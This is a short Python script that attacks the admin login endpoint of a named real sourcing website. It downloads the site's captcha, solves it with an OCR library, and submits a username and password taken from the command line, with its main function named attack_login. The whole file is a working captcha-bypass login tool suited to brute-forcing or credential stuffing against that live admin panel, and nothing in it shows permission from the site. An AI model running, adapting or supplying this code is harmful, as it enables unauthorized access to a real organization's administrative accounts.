import re
import base64
import requests
import ddddocr
import json
import sys

# import uuid
url_login='https://api.bebonsourcing.com/api/admin/login'
url_captch='https://api.bebonsourcing.com/api/admin/captcha'

# result_captch=decode_captch()
# print(result_captch)


def get_captch(url):
    headers = {'Host': 'api.xxxx.com',
           'Referer': 'https://xxxx.xxxx.com/',
            }  # 设置请求头
    res = requests.get(url=url,headers=headers).text
    # print(res)
    obj=re.search('{"data":{"captcha":{"sensitive":false,"key":"(?P<key>.*?)","img":".*?,(?P<img>.*?)"',res)
    key=obj['key']
    img=obj['img']

    img_save=base64.urlsafe_b64decode(img)

    # filename = "{}.{}".format(uuid.uuid4(), img) 
    with open("/home/kali/captcha.png", "wb") as f:
        f.write(img_save)
    return key



def decode_captch():

    ocr = ddddocr.DdddOcr()
    image = open("/home/kali/captcha.png", "rb").read()
    result = ocr.classification(image)
    return result

def attack_login(url):
    headers = {'Host': 'api.xxxxxxx.com',
            'Content-Type': 'application/json;charset=UTF-8',
            'Sec-Ch-Ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.118 Safari/537.36',
           'Referer': 'https://admin.bebonsourcing.com/',
           'Accept': 'application/json, text/plain, */*',
           'Origin': 'https://xxx.xxxxxx.com'
           
            }  # 设置请求头
    
    key=get_captch(url_captch)
    result_captch=decode_captch()
    data = {
        "username":sys.argv[1],
        "password":sys.argv[2],
        "captcha":result_captch,
        "key":key
    }  # 设置请求体
    # print(data)
    res = requests.post(url=url,headers=headers,data=json.dumps(data))
    res_json=json.loads(res.text)
    print(res_json['message'])



attack_login(url_login)


# attack_login(url_login)



